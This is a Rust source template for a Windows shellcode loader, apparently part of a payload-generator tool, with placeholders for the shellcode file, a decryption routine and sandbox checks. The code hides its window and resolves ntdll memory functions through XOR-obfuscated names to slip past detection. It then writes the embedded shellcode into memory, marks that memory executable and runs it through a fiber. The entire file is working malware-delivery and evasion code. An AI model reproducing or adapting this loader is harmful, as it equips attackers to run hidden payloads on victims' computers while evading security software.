#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

use std::ffi::CString;
use std::include_bytes;
use std::ptr::null_mut;

use winapi::{
    um::{
        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, PAGE_EXECUTE_READ},
        libloaderapi::{GetModuleHandleA, GetProcAddress},
    },
    shared::{
        ntdef::{NT_SUCCESS, HANDLE},
    },
    ctypes::c_void,
};
use windows_sys::Win32::{
    System::Threading::{
        ConvertThreadToFiber, CreateFiberEx, SwitchToFiber, LPFIBER_START_ROUTINE,
    },
};

{{IMPORTS}}

{{SANDBOX_IMPORTS}}

{{DECRYPTION_FUNCTION}}

const K: u8 = {{API_KEY}};
const OBF_B: &[u8] = &{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}};
const OBF_C: &[u8] = &{{OBF_NT_WRITE_VIRTUAL_MEMORY}};
const OBF_D: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};

fn r(d: &[u8]) -> Vec<u8> {
    d.iter().map(|b| b ^ K).collect()
}

unsafe fn g(n: &[u8]) -> *const () {
    let h = GetModuleHandleA(b"ntdll\0".as_ptr() as *const i8);
    let s = r(n);
    let c = CString::new(s).unwrap();
    GetProcAddress(h, c.as_ptr()) as *const ()
}

type FB = unsafe extern "system" fn(HANDLE, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
type FC = unsafe extern "system" fn(HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;
type FD = unsafe extern "system" fn(HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;

fn enhance(mut buf: Vec<u8>) {
    let current_process: HANDLE = -1isize as HANDLE;

    unsafe {
        let f_alloc: FB = std::mem::transmute(g(OBF_B));
        let f_write: FC = std::mem::transmute(g(OBF_C));
        let f_protect: FD = std::mem::transmute(g(OBF_D));

        let mut base: *mut c_void = null_mut();
        let mut size: usize = buf.len();
        let s = f_alloc(current_process, &mut base, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(s) { return; }

        let mut written = 0;
        let ptr = buf.as_mut_ptr() as *mut c_void;
        let len = buf.len();
        let s = f_write(current_process, base, ptr, len, &mut written);
        if !NT_SUCCESS(s) { return; }

        let mut old: u32 = PAGE_READWRITE;
        let mut psize = len;
        let s = f_protect(current_process, &mut base, &mut psize, PAGE_EXECUTE_READ, &mut old);
        if !NT_SUCCESS(s) { return; }

        let buf_ptr: LPFIBER_START_ROUTINE = std::mem::transmute(base);
        let buf_fiber_address = CreateFiberEx(0, 0, 0, buf_ptr, null_mut());
        if buf_fiber_address.is_null() { return; }

        let primary_fiber_address = ConvertThreadToFiber(null_mut());
        if primary_fiber_address.is_null() { return; }

        SwitchToFiber(buf_fiber_address);
    }
}

fn main() {
    {{SANDBOX}}

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});

    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }
    
    {{MAIN}}

    enhance(vec.clone());
}

{{DLL_MAIN}}